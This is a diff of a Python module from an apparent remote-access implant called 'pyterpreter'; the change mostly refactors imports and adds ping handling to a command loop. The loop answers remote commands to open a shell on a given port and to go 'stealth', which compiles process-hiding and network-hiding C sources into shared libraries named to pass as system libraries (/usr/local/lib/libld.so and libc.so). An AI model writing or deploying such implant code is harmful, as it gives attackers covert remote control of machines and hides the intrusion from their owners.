@@ -1,20 +1,24 @@
 import os
-from queue import SimpleQueue
+import subprocess
 import tempfile
 
 
 from core.message import Message, MESSAGE_PURPOSE
 
 from pyterpreter import config
-from pyterpreter.util import *
+from pyterpreter import util
 
 
-def process_messages_forever(messages_received_queue: 'SimpleQueue[Message]'):
+def process_messages_forever():
     while True:
-        message = messages_received_queue.get()
-        print(f'Received message {message}')
+        message = config.messages_received.get()
+        if message.purpose != MESSAGE_PURPOSE.PING:
+            print(f'Received message {message}')
 
-        if message.purpose == MESSAGE_PURPOSE.OPEN_SHELL:
+        if message.purpose == MESSAGE_PURPOSE.PING:
+            config.messages_to_send.put(Message(MESSAGE_PURPOSE.PING))
+
+        elif message.purpose == MESSAGE_PURPOSE.OPEN_SHELL:
             _do_open_shell(int(message.args[0]))
 
         elif message.purpose == MESSAGE_PURPOSE.STEALTH:
@@ -26,7 +30,7 @@ def _do_open_shell(port: int):
 
 
 def _do_stealth():
-    has_gcc_code = process_get_cmd_output('gcc --version')[0]
+    has_gcc_code = util.process_get_cmd_output('gcc --version')[0]
     network_hider_filename = '/usr/local/lib/libld.so'
     process_hider_filename = '/usr/local/lib/libc.so'
     if not os.path.isdir(os.path.dirname(network_hider_filename)):
@@ -38,15 +42,15 @@ def _do_stealth():
         print('Building stealth exploits from source')
         network_hider_source_fd, network_hider_source_filename = tempfile.mkstemp(suffix='.c')
         process_hider_source_fd, process_hider_source_filename = tempfile.mkstemp(suffix='.c')
-        network_hider_source = resource_get('stealth_network_hider.c')
-        process_hider_source = resource_get('stealth_process_hider.c')
+        network_hider_source = util.resource_get('stealth_network_hider.c')
+        process_hider_source = util.resource_get('stealth_process_hider.c')
         os.write(network_hider_source_fd, network_hider_source)
         os.write(process_hider_source_fd, process_hider_source)
         os.close(network_hider_source_fd)
         os.close(process_hider_source_fd)
 
-        assert 0 == process_get_cmd_output(f'gcc -fPIC -shared -o {network_hider_filename} {network_hider_source_filename} -ldl')[0], 'Building network hider failed'
-        assert 0 == process_get_cmd_output(f'gcc -fPIC -shared -o {process_hider_filename} {process_hider_source_filename} -ldl')[0], 'Building process hider failed'
+        assert 0 == util.process_get_cmd_output(f'gcc -fPIC -shared -o {network_hider_filename} {network_hider_source_filename} -ldl')[0], 'Building network hider failed'
+        assert 0 == util.process_get_cmd_output(f'gcc -fPIC -shared -o {process_hider_filename} {process_hider_source_filename} -ldl')[0], 'Building process hider failed'
 
         os.unlink(network_hider_source_filename)
         os.unlink(process_hider_source_filename)
